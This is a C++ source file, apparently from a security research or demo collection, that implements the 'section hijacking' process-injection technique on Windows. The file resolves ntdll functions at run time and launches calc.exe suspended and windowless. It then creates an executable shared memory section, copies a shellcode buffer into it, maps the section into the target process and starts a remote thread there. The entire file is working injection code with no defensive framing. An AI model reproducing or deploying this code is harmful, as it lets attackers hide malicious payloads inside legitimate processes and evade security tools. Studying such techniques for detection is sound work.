/**
 * @file CreateSection.cpp
 * @author Giulio De Pasquale, hasherezade
 * @brief Section Hijacking
 */
#include "CreateSection.h"
#include "utils.h"

 /**
  * @brief This function populate the necessary library function pointers.
  *
  * In order to use WINAPI's functions, we require to do some run-time dynamic
  * linking. This helper function retrieves the handle of **ntdll.dll**. Once
  * opened, several function pointers will be initialized
  * with their corresponding WINAPI's counterpart.
  * @see
  * https://msdn.microsoft.com/it-it/library/windows/desktop/ms683199(v=vs.85).aspx
  * @see
  * https://en.wikipedia.org/wiki/Dynamic-link_library#Explicit_run-time_linking
  */
BOOL LoadNtdllFunctions() {
	HMODULE hNtdll = GetModuleHandleA("ntdll");
	if (hNtdll == NULL)
		return FALSE;

	ZwQueryInformationProcess =
		(NTSTATUS(NTAPI *)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))
		GetProcAddress(hNtdll, "ZwQueryInformationProcess");
	if (ZwQueryInformationProcess == NULL)
		return FALSE;

	ZwCreateSection = (NTSTATUS(NTAPI *)(
		PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG,
		HANDLE))GetProcAddress(hNtdll, "ZwCreateSection");
	if (ZwCreateSection == NULL)
		return FALSE;

	NtMapViewOfSection = (NTSTATUS(NTAPI *)(
		HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T,
		DWORD, ULONG, ULONG))GetProcAddress(hNtdll, "NtMapViewOfSection");
	if (NtMapViewOfSection == NULL)
		return FALSE;

	ZwCreateThreadEx =
		(NTSTATUS(NTAPI *)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE,
			PVOID, PVOID, ULONG, ULONG_PTR, SIZE_T, SIZE_T,
			PVOID))GetProcAddress(hNtdll, "ZwCreateThreadEx");
	if (ZwCreateThreadEx == NULL)
		return FALSE;

	ZwUnmapViewOfSection = (NTSTATUS(NTAPI *)(HANDLE, PVOID))GetProcAddress(
		hNtdll, "ZwUnmapViewOfSection");
	if (ZwUnmapViewOfSection == NULL)
		return FALSE;

	ZwClose = (NTSTATUS(NTAPI *)(HANDLE))GetProcAddress(hNtdll, "ZwClose");
	if (ZwClose == NULL)
		return FALSE;

	return TRUE;
}

int main(void) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	PROCESS_BASIC_INFORMATION pbi;
	wchar_t app_path[260];
	HANDLE hToken = NULL, hNewToken = NULL, hSection = NULL, hProcess = NULL,
		threadHandle = NULL;
	OBJECT_ATTRIBUTES hAttributes;
	LARGE_INTEGER maxSize;
	NTSTATUS status = NULL;
	PVOID sectionBaseAddress = NULL, sectionBaseAddress2 = NULL;
	SIZE_T viewSize = 0;
	DWORD inheritDisposition = 1; // VIEW_SHARE

	/*
	* Initialize WINAPI function pointers
	*/
	if (LoadNtdllFunctions() == FALSE) {
		DBG_ERROR(("Failed to load NTDLL function\n"));
		return -1;
	}

	// Zeroing si, pi, pbi and hAttributes
	memset(&si, 0, sizeof(STARTUPINFO));
	memset(&pi, 0, sizeof(PROCESS_INFORMATION));
	memset(&pbi, 0, sizeof(PROCESS_BASIC_INFORMATION));
	memset(&hAttributes, 0, sizeof(OBJECT_ATTRIBUTES));
	si.cb = sizeof(STARTUPINFO);

	// Generating full path to calc.exe
	ExpandEnvironmentStrings(L"%SystemRoot%\\system32\\calc.exe",
		(LPWSTR)app_path, sizeof(app_path));
	WDBG_INFO((L"Bening process' full path = %s\n", app_path));

	DBG_INFO(("Creating suspended process...\n"));
	if (!CreateProcessW((LPWSTR)app_path, // lpApplicationName
		NULL,             // lpCommandLine
		NULL,             // lpProcessAttributes
		NULL,             // lpThreadAttributes
		NULL,             // bInheritHandles
		CREATE_SUSPENDED | DETACHED_PROCESS |
		CREATE_NO_WINDOW, // dwCreationFlags
		NULL,                 // lpEnvironment
		NULL,                 // lpCurrentDirectory
		&si,                  // lpStartupInfo
		&pi                   // lpProcessInformation
	)) {
		DBG_ERROR(("CreateProcess failed, Error = %x\n", GetLastError()));
		return -1;
	}

	maxSize.HighPart = 0;
	maxSize.LowPart = 0x1000;

	DBG_INFO(("Creating a new section...\n"));
	if ((status = ZwCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize,
		PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) !=
		STATUS_SUCCESS) {
		DBG_ERROR(("ZwCreateSection failed, status : %x\n", status));
		return -1;
	}
	DBG_SUCC(("Section handle: %p\n", hSection));

	DBG_INFO(("Mapping the section into current process' context...\n"));
	if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(),
		&sectionBaseAddress, NULL, NULL, NULL,
		&viewSize, inheritDisposition, NULL,
		PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS) {
		DBG_ERROR(("NtMapViewOfSection failed, status : %x\n", status));
		return -1;
	}
	DBG_SUCC(("Section BaseAddress: %p\n", sectionBaseAddress));

	DBG_INFO(("Copying shellcode into section ...\n"));
	memcpy(sectionBaseAddress, shellcode, sizeof(shellcode));
	DBG_SUCC(("Shellcode copied!\n"));

	DBG_INFO(("Mapping the section into target process' context ...\n"));
	if ((status =
		NtMapViewOfSection(hSection, pi.hProcess, &sectionBaseAddress2, NULL,
			NULL, NULL, &viewSize, inheritDisposition, NULL,
			PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS) {
		DBG_ERROR(("NtMapViewOfSection failed, status : %x\n", status));
		return -1;
	}
	DBG_SUCC(("Section correctly mapped!\n"));

	DBG_INFO(("Unmapping section from current process ...\n"));
	ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);
	ZwClose(hSection);
	hSection = NULL;
	DBG_SUCC(("Section unmapped from current process!\n"));

	DBG_INFO(("Creating a new thread for the injected shellcode ...\n"));
	if ((status = ZwCreateThreadEx(&threadHandle, 0x1FFFFF, NULL, pi.hProcess,
		sectionBaseAddress2, NULL, CREATE_SUSPENDED, 0,
		0, 0, 0)) != STATUS_SUCCESS) {
		DBG_ERROR(("ZwCreateThreadEx failed, status : %x\n", status));
		return -1;
	}
	DBG_SUCC(("Thread created. PID = %p\n", threadHandle));
	DBG_INFO(("Resuming threads...\n"));
	ResumeThread(pi.hThread);   // main Thread of calc.exe
	ResumeThread(threadHandle); // injection
	return 0;
}